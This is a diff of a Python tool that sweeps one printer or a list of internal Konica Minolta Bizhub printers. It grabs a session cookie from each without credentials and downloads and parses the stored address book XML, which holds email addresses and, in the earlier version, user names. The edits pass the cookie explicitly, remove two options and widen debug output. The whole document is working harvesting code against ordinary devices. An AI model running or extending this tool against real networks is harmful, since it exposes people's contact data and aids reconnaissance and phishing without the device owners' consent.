@@ -14,15 +14,10 @@ warnings.simplefilter("ignore", InsecureRequestWarning)
 CHUNK_SIZE = 50  # Number of entries to request each time
 
 def parse_args():
-    parser = argparse.ArgumentParser(
-        description="Chunked Bizhub address book fetch: auto-get or use a known cookie, then fetch in pages of 50."
-    )
+    parser = argparse.ArgumentParser(description="Fetch address book from internal network printers (Bizhub).")
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("--ip", help="Single IP or hostname.")
     group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
-
-    parser.add_argument("-c", "--cookie", default=None, help="If you already have a valid 'ID=...' cookie, supply it here.")
-    parser.add_argument("-n", "--names", action="store_true", help="If set, also dump the list of user names (in addition to emails).")
     parser.add_argument("-d", "--debug", action="store_true", help="Print debug info, including response details and cookie info.")
     return parser.parse_args()
 
@@ -40,11 +35,10 @@ def auto_get_cookie(host, debug=False):
 
             r.raise_for_status()
             if "ID" in session.cookies:
+                cookie_value = session.cookies.get_dict().get("ID", "")
                 if debug:
-                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}:")
-                    for ck in session.cookies:
-                        print("   ", ck.name, "=", ck.value)
-                return session, protocol  # Return the session and working protocol
+                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}: ID={cookie_value}")
+                return session, protocol, cookie_value  # Return session, protocol, and cookie value
 
         except requests.exceptions.RequestException as e:
             if debug:
@@ -52,14 +46,14 @@ def auto_get_cookie(host, debug=False):
             continue  # Try the next protocol
 
     print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
-    return None, None
+    return None, None, None
 
-def fetch_abbr_chunk(host, protocol, session=None, debug=False):
+def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, debug=False):
     """Fetch the full address book XML using the detected working protocol."""
     url = f"{protocol}://{host}/wcd/abbr.xml"
+    headers = {"Cookie": f"ID={cookie_value}"} if cookie_value else {}
 
     try:
-        headers = {'Cookie': session.cookies.get_dict()} if session else {}
         if session:
             if debug:
                 print(f"[DEBUG] Fetching address book using session cookie over {protocol.upper()}.")
@@ -71,7 +65,7 @@ def fetch_abbr_chunk(host, protocol, session=None, debug=False):
 
         if debug:
             print(f"[DEBUG] Response status: {resp.status_code}")
-            print(f"[DEBUG] Response body (first 500 chars): {resp.text[:500]}")
+            print(f"[DEBUG] Response body (first 1000 chars):\n{resp.text[:1000]}")
 
         if resp.status_code == 200:
             return resp.text  # Return raw XML response
@@ -95,7 +89,7 @@ def parse_xml(xml_data, debug=False):
         if address_section is None:
             if debug:
                 print(f"[DEBUG] No <Address> block found in XML.")
-                print(f"[DEBUG] XML Response snippet:\n{xml_data[:500]}")
+                print(f"[DEBUG] XML Response snippet:\n{xml_data[:1000]}")
             return []
 
         abbr_list = address_section.find("AbbrList")
@@ -131,11 +125,11 @@ def parse_xml(xml_data, debug=False):
 
 def process_host(host, debug=False):
     """Handles the full address book extraction for a single host."""
-    session, protocol = auto_get_cookie(host, debug=debug)
+    session, protocol, cookie_value = auto_get_cookie(host, debug=debug)
     if not session:
         return
 
-    xml_data = fetch_abbr_chunk(host, protocol, session=session, debug=debug)
+    xml_data = fetch_abbr_chunk(host, protocol, session=session, cookie_value=cookie_value, debug=debug)
     if not xml_data:
         print(f"[!] No XML data retrieved for {host}.")
         return
